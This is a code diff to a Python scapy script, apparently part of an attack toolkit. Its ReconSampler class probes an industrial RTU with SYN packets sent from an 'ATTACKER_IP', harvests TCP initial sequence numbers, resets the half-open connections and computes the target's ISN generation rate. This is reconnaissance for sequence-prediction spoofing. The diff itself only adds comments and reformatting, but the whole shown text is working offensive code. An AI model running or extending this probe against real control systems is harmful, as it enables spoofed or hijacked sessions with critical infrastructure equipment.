@@ -8,6 +8,7 @@ import socket
 import struct
 from scapy.all import IP, TCP, sr1, conf
 
+# Keep scapy quiet during probing
 conf.verb = 0
 
 RTU_IP = "10.0.1.20"
@@ -16,6 +17,8 @@ ATTACKER_IP = "10.0.2.50"
 
 
 class ReconSampler:
+    """Probes the target RTU to measure its ISN clock generation speed."""
+
     def __init__(self, target_ip: str = RTU_IP, target_port: int = RTU_PORT):
         self.target_ip = target_ip
         self.target_port = target_port
@@ -25,16 +28,21 @@ class ReconSampler:
         Sends an un-spoofed SYN to the RTU server and extracts the returned ISN from SYN-ACK.
         Returns: (isn, timestamp)
         """
+        # Pick a transient source port to avoid state collisions on back-to-back probes
         sport = 55000 + int(time.time() * 100) % 5000
-        syn = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags="S", seq=1000)
+        syn = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(
+            sport=sport, dport=self.target_port, flags="S", seq=1000
+        )
         
         t_sent = time.time()
         resp = sr1(syn, timeout=2.0, verbose=False)
         
-        if resp and resp.haslayer(TCP) and resp[TCP].flags & 0x12 == 0x12:  # SYN-ACK
+        if resp and resp.haslayer(TCP) and resp[TCP].flags & 0x12 == 0x12:  # SYN-ACK received
             isn = resp[TCP].seq
-            # Close connection cleanly
-            rst = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags="R", seq=1001)
+            # Immediately tear down the half-open socket with an RST so we don't leave lingering state
+            rst = IP(src=ATTACKER_IP, dst=self.target_ip) / TCP(
+                sport=sport, dport=self.target_port, flags="R", seq=1001
+            )
             sr1(rst, timeout=0.1, verbose=False)
             return isn, t_sent
         else:
@@ -56,6 +64,7 @@ class ReconSampler:
         print(f"[RECON] Sample 2: ISN = {isn2} at t = {t2:.4f}")
 
         delta_t = t2 - t1
+        # Handle 32-bit unsigned modular wrap-around cleanly
         delta_isn = (isn2 - isn1) & 0xFFFFFFFF
         clock_rate = delta_isn / delta_t
 
